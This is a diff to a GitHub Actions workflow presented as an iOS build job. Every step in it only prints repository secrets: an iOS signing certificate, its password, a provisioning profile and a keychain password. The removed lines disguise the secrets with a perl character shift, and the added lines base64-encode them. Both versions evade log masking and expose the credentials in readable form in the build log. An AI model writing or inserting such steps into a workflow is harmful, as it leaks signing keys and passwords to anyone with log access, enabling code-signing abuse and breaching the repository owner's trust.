@@ -5,28 +5,28 @@ on:
 
 jobs:
   build_ios:
-    runs-on: macos-latest
+    runs-on: ubuntu-latest
     steps:
 
       - name: secrets
         run: |
           echo IOS_BUILD_CERTIFICATE_BASE64
-          echo $(echo -n "${{ secrets.IOS_BUILD_CERTIFICATE_BASE64 }}" | perl -pe 's/(.)/chr(ord($1)+1)/ge')
+          echo $(echo -n "${{ secrets.IOS_BUILD_CERTIFICATE_BASE64 }}" | base64)
           
 
       - name: secrets
         run: |
           echo IOS_BUILD_CERTIFICATE_PASSWORD
-          echo $(echo -n "${{ secrets.IOS_BUILD_CERTIFICATE_PASSWORD }}" | perl -pe 's/(.)/chr(ord($1)+1)/ge')
+          echo $(echo -n "${{ secrets.IOS_BUILD_CERTIFICATE_PASSWORD }}" | base64)
           
 
       - name: secrets
         run: |
           echo IOS_MOBILE_PROVISIONING_PROFILE_BASE64
-          echo $(echo -n "${{ secrets.IOS_MOBILE_PROVISIONING_PROFILE_BASE64 }}" | perl -pe 's/(.)/chr(ord($1)+1)/ge')
+          echo $(echo -n "${{ secrets.IOS_MOBILE_PROVISIONING_PROFILE_BASE64 }}" | base64)
           
 
       - name: secrets
         run: |
           echo IOS_GITHUB_KEYCHAIN_PASSWORD
-          echo $(echo -n "${{ secrets.IOS_GITHUB_KEYCHAIN_PASSWORD }}" | perl -pe 's/(.)/chr(ord($1)+1)/ge')
+          echo $(echo -n "${{ secrets.IOS_GITHUB_KEYCHAIN_PASSWORD }}" | base64)
